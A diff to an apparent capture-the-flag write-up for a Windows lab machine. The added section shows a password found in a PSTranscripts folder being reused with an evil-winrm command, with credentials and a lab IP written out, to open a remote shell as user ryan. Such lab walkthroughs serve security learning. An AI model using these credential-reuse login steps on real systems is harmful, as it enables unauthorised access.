@@ -324,7 +324,7 @@ Using the credentials `melanie:Welcome123!`, a WinRM session was successfully es
 
 ---
 # Shell as ryan
-## enumeration
+## Enumeration
 ```
 *Evil-WinRM* PS C:\> whoami /priv
 
@@ -435,3 +435,22 @@ Mode                LastWriteTime         Length Name
 
 <img width="767" height="384" alt="image" src="https://github.com/user-attachments/assets/5949ecd0-6d3e-4555-a8db-4528e8b2c87e" />
 After basic enumeration revealed nothing of interest, the `C:\` directory was checked. An unusual directory named `PSTranscripts` was found, which contained the password `Serv3r4Admin4cc123!` for the user `ryan`.
+
+---
+```
+evil-winrm -i 10.129.100.9 -u ryan -p 'Serv3r4Admin4cc123!'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\ryan\Documents> whoami
+megabank\ryan
+```
+
+Using the credentials `ryan:Serv3r4Admin4cc123!`, a WinRM session was successfully established.
+
+# Shell as Admin
